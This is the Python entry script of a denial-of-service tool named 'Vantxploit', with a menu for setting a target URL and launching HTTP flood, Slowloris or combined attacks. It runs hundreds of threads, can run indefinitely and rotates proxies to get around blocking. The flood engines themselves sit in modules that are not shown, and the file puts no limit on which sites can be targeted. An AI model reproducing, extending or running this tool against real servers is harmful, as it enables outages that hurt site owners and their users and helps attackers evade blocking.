#!/usr/bin/env python3
import os, sys, time, threading
from ui.banner import *
from ui.colors import *
from ui.dashboard import Dashboard
from core.target import validate_url, resolve_target, health_check
from core.stats import AttackStats
from core.http_flood import HTTPFloodEngine
from core.slowloris import SlowlorisEngine
from core.proxy_rotator import ProxyRotator
from utils.helpers import rand_ip, dt

target_url = ""
target_info = None
attack_dur = 37
attack_workers = 200
attack_mode = "manual"
proxy_file = "proxies.txt"
proxy_rotator = None

def print_menu():
    tl = chr(0x2554); tr = chr(0x2557)
    ml = chr(0x2560); mr = chr(0x2563)
    bl = chr(0x255A); br = chr(0x255D)
    vl = chr(0x2551); ln = chr(0x2550)
    sp = chr(0x0020) * 68

    t_disp = f"{G}{B}{target_url}" if target_url else f"{BV}{BL}NOT SET"

    print()
    print(f"  {DP}{tl}{ln*68}{tr}{RS}")
    print(f"  {DP}{vl}{RS}        {BV}{B}[ VANTXPLOIT — STRIKE COMMAND CENTER ]{RS}        {' '*24}{DP}{vl}{RS}")
    print(f"  {DP}{ml}{ln*68}{mr}{RS}")
    print(f"  {DP}{vl}{RS}{sp}{DP}{vl}{RS}")
    print(f"  {DP}{vl}{RS}   {LV}{B}[1]{RS}  {W}Set Target URL{RS}{' '*50}{DP}{vl}{RS}")
    print(f"  {DP}{vl}{RS}   {G}{B}[2]{RS}  {G}{B}HTTP Flood Attack{RS}{' '*46}{DP}{vl}{RS}")
    print(f"  {DP}{vl}{RS}   {BV}{B}[3]{RS}  {BV}{B}Slowloris Attack{RS}{' '*47}{DP}{vl}{RS}")
    print(f"  {DP}{vl}{RS}   {Y}{B}[4]{RS}  {Y}{B}Multi-Vector Attack{RS}{' '*44}{DP}{vl}{RS}")
    print(f"  {DP}{vl}{RS}   {MV}[5]{RS}  {MV}Configure{RS}{' '*54}{DP}{vl}{RS}")
    print(f"   {DP}{vl}{RS}   {LV}[6]{RS}  {LV}Load Proxy List{RS}{' '*48}{DP}{vl}{RS}")
    print(f"   {DP}{vl}{RS}   {GY}[7]{RS}  {GY}Exit{RS}{' '*60}{DP}{vl}{RS}")
    print(f"  {DP}{vl}{RS}{sp}{DP}{vl}{RS}")
    print(f"  {DP}{ml}{ln*68}{mr}{RS}")
    print(f"  {DP}{vl}{RS}  {GY}TARGET  :{RS}  {t_disp:<54}{RS}{' '*2}{DP}{vl}{RS}")
    print(f"  {DP}{vl}{RS}  {GY}NODE IP :{RS}  {W}{rand_ip():<54}{RS}  {DP}{vl}{RS}")
    print(f"  {DP}{vl}{RS}  {GY}TIME    :{RS}  {W}{dt():<54}{RS}  {DP}{vl}{RS}")
    pxy_str = f"{G}BYPASS" if (proxy_rotator and proxy_rotator.available) else f"{GY}DISABLED"
    mode_str = f"{Y}MANUAL" if attack_mode == "manual" else f"{MV}TIMED"
    print(f"  {DP}{vl}{RS}  {GY}PROXIES :{RS}  {pxy_str:>7}{RS}  {GY}MODE :{RS}  {mode_str}{RS}  {' '*39}{DP}{vl}{RS}")
    print(f"  {DP}{bl}{ln*68}{br}{RS}")
    print()

def launch_attack(mode):
    global attack_dur, attack_workers, target_info, proxy_rotator, attack_mode

    if not target_url:
        print(f"\n  {BV}{B}[-]{RS}  No target set! Use {LV}[1]{RS} first.\n")
        time.sleep(1.2)
        return

    clear()

    info = resolve_target(target_url)
    if not info.ip:
        print(f"\n  {R}{B}[-]{RS}  Could not resolve target: {info.error}\n")
        time.sleep(2)
        return

    target_info = info

    dur = None if attack_mode == "manual" else attack_dur
    stats = AttackStats()
    dash = Dashboard(stats, duration=dur, mode=mode)

    dash.show_header(target_url)

    steps = [
        ("Initializing real socket pool", BV),
        ("Resolving target DNS records", P),
        ("Arming HTTP flood vectors", LV),
        (f"Target locked: {info.ip}:{info.port}", MV),
        ("Strike authorized — FIRING", BV),
    ]
    for label, col in steps:
        fake_progress(label, width=30, color=col)
        time.sleep(0.05)

    tl = chr(0x2554); tr = chr(0x2557)
    bl = chr(0x255A); br = chr(0x255D)
    vl = chr(0x2551); ln = chr(0x2550)
    print()
    print(f"  {DP}{tl}{ln*68}{tr}{RS}")
    print(f"  {DP}{vl}{RS}  {BV}{B}{BL}{'  FLOODING ACTIVE — LIVE TELEMETRY  ':^68}{RS}  {DP}{vl}{RS}")
    print(f"  {DP}{bl}{ln*68}{br}{RS}\n")

    engines = []

    if mode == "HTTP Flood":
        engine = HTTPFloodEngine(
            target=target_info,
            workers=attack_workers,
            duration=dur if dur else 999999,
            stats=stats,
            proxy_rotator=proxy_rotator,
        )
        engines.append(engine)

    elif mode == "Slowloris":
        engine = SlowlorisEngine(
            target_ip=target_info.ip,
            target_port=target_info.port,
            num_connections=attack_workers,
            duration=dur if dur else 999999,
            stats=stats,
            host_header=target_info.host,
        )
        engines.append(engine)

    elif mode == "Multi-Vector":
        hf = HTTPFloodEngine(
            target=target_info,
            workers=max(1, attack_workers // 2),
            duration=dur if dur else 999999,
            stats=stats,
            proxy_rotator=proxy_rotator,
        )
        sl = SlowlorisEngine(
            target_ip=target_info.ip,
            target_port=target_info.port,
            num_connections=max(1, attack_workers // 2),
            duration=dur if dur else 999999,
            stats=stats,
            host_header=target_info.host,
        )
        engines = [hf, sl]

    dash.start()
    threads = []
    for eng in engines:
        t = threading.Thread(target=eng.run, daemon=True)
        t.start()
        threads.append(t)

    if attack_mode == "manual":
        input(f"\n  {Y}Press Enter to stop the attack...{RS}")
        for eng in engines:
            eng.stop()
    else:
        for t in threads:
            t.join(timeout=attack_dur + 2)
        for eng in engines:
            eng.stop()

    for t in threads:
        t.join(timeout=5)
    dash.stop()
    dash.show_report()
    input(f"\n  {Y}Press Enter to return to menu...{RS}")
    clear()
    ascii_header()

def set_target():
    global target_url, target_info
    print(f"\n  {BV}{B}[*] Enter target URL:{RS}")
    print(f"  {GY}  Example: http://localhost:8080{RS}\n")
    try:
        url = input(f"  {W}  > {RS}").strip()
    except (EOFError, KeyboardInterrupt):
        url = ""
    if url:
        if not validate_url(url):
            print(f"\n  {R}{B}[-]{RS}  Invalid URL format. Use http:// or https://\n")
            time.sleep(1.5)
            return
        target_url = url
        target_info = None
        print(f"\n  {G}{B}[+]{RS}  Target locked: {W}{B}{target_url}{RS}")
        info = resolve_target(target_url)
        if info.ip:
            print(f"  {GY}[i]{RS}  Resolved to {W}{info.ip}:{info.port}{RS}")
        else:
            print(f"  {Y}[!]{RS}  DNS resolution failed: {info.error}")
    else:
        print(f"\n  {BV}[-]{RS}  No target entered.")
    time.sleep(1.0)

def configure():
    global attack_dur, attack_workers, attack_mode
    print(f"\n  {MV}{B}[*] Configuration:{RS}\n")
    try:
        mode_in = input(f"  {GY}  Attack mode (timed/manual) [{attack_mode}]: {RS}").strip().lower()
        if mode_in in ("timed", "manual"):
            attack_mode = mode_in
        if attack_mode == "timed":
            dur = input(f"  {GY}  Duration (seconds) [{attack_dur}]: {RS}").strip()
            if dur:
                attack_dur = max(5, int(dur))
        wrk = input(f"  {GY}  Workers/Threads [{attack_workers}]: {RS}").strip()
        if wrk:
            attack_workers = max(10, int(wrk))
        print(f"\n  {G}{B}[+]{RS}  Mode: {W}{attack_mode}{RS}  |  "
              f"{'Duration: ' + str(attack_dur) + 's' if attack_mode == 'timed' else 'Infinite'}{RS}  |  "
              f"Workers: {W}{attack_workers}{RS}")
    except (ValueError, EOFError):
        print(f"\n  {Y}[!]{RS}  Invalid input, keeping current values.")
    time.sleep(1.0)

def load_proxies():
    global proxy_rotator, proxy_file
    print(f"\n  {LV}{B}[*] Loading proxy list...{RS}")
    path = input(f"  {GY}  Path [{proxy_file}]: {RS}").strip()
    if path:
        proxy_file = path.replace("~", os.path.expanduser("~"))

    if os.path.isdir(proxy_file):
        files = [f for f in os.listdir(proxy_file) if f.endswith(".txt")]
        if not files:
            print(f"  {Y}[!]{RS}  No .txt files found in '{proxy_file}'.")
            time.sleep(1.5)
            return
        print(f"  {GY}  Select a file:{RS}")
        for i, f in enumerate(files, 1):
            fpath = os.path.join(proxy_file, f)
            size = os.path.getsize(fpath)
            print(f"  {W}    {i}. {f}{RS}  {GY}({size//1000} KB){RS}")
        try:
            sel = input(f"\n  {BV}  Choice (1-{len(files)}): {RS}").strip()
            proxy_file = os.path.join(proxy_file, files[int(sel) - 1])
        except (ValueError, IndexError):
            print(f"  {Y}[!]{RS}  Invalid selection.")
            time.sleep(1.0)
            return

    proxy_rotator = ProxyRotator(proxy_file)
    if proxy_rotator.available:
        print(f"  {G}{B}[+]{RS}  Loaded {W}{proxy_rotator.count}{RS} proxies from '{proxy_file}'.")
    else:
        print(f"  {Y}[!]{RS}  No proxies found in '{proxy_file}'.")
        print(f"  {GY}     Format: ip:port (one per line){RS}")
    time.sleep(1.0)

def main():
    vantx_intro()
    clear()
    ascii_header()
    startup_messages()

    while True:
        print_menu()
        try:
            choice = input(f"  {W}{B}vantx@exploit{RS}{GY}:{RS}{DP}~#{RS} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n\n  {Y}[*] Interrupted.{RS}\n")
            sys.exit(0)

        if choice == "1":
            set_target()
        elif choice == "2":
            launch_attack("HTTP Flood")
        elif choice == "3":
            launch_attack("Slowloris")
        elif choice == "4":
            launch_attack("Multi-Vector")
        elif choice == "5":
            configure()
        elif choice == "6":
            load_proxies()
        elif choice == "7":
            print(f"\n  {Y}[*]{RS}  Shutting down Vantxploit...")
            time.sleep(0.4)
            print(f"  {G}{B}[+]{RS}  Goodbye.\n")
            sys.exit(0)
        else:
            print(f"\n  {BV}[-]{RS}  Invalid option. Use 1-7.")
            time.sleep(0.5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {Y}[*] Session terminated.{RS}\n")
        sys.exit(0)
